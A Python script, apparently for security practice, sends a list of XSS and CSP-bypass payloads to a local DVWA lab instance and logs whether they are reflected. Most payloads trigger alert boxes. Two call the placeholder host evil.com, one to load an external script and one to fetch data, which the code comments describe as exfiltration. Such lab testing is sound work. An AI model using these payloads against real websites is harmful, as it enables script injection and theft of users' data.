import requests
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_csp_bypass(session, base_url):
    # Define payloads to test CSP bypass
    payloads = [
        '<script>alert(1)</script>',  # Basic XSS script
        '<img src="x" onerror="alert(2)">',  # XSS using an image error handler
        '<svg/onload=alert(3)>',  # XSS using SVG onload attribute
        '<iframe src="javascript:alert(4)"></iframe>',  # Attempt to load an iframe with JavaScript
        '<script src="https://evil.com/malicious.js"></script>',  # External script inclusion
        '<script>fetch("https://evil.com/steal").then(r => r.text().then(t => alert(t)))</script>',  # Fetch API to exfiltrate data
        '<a href="javascript:alert(5)">Click me</a>',  # JavaScript URL in a hyperlink
        '<object data="javascript:alert(6)"></object>',  # Object tag with JavaScript
        '<div style="background-image: url(javascript:alert(7))"></div>',  # CSS-based injection
        '<link rel="stylesheet" href="javascript:alert(8)">',  # External CSS with JavaScript
        '<meta http-equiv="refresh" content="0;url=javascript:alert(9)">',  # Meta tag with JavaScript
        '<script nonce="invalidnonce">alert(10)</script>',  # Attempt to bypass using a nonce
        '<script>alert(document.domain)</script>',  # Script to see if it's reflected and executed
        '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMTEpPjwvc3ZnPg==">',  # Base64-encoded SVG with script
    ]
    
    endpoint = 'vulnerabilities/csp/'  # Hypothetical vulnerable endpoint

    for i, payload in enumerate(payloads):
        data = {'input': payload, 'Submit': 'Submit'}
        try:
            response = session.post(base_url + endpoint, data=data, timeout=10)
            logging.info(f"Payload {i+1}: Sent payload of size {len(payload)}")

            # Check if the payload is reflected or executed
            if "alert" in response.text:
                logging.warning(f"CSP Bypass vulnerability potentially detected at {base_url}{endpoint} with payload: {payload}")
            else:
                logging.info(f"No CSP Bypass detected at {base_url}{endpoint} with payload {payload}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for payload {i+1} with size {len(payload)}: {e}")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  # Adjust for local DVWA instance
    
    # Ensure the session is logged in and security level is set to low
    from set_security import set_dvwa_security
    if set_dvwa_security(session, base_url, 'low'):
        test_csp_bypass(session, base_url)
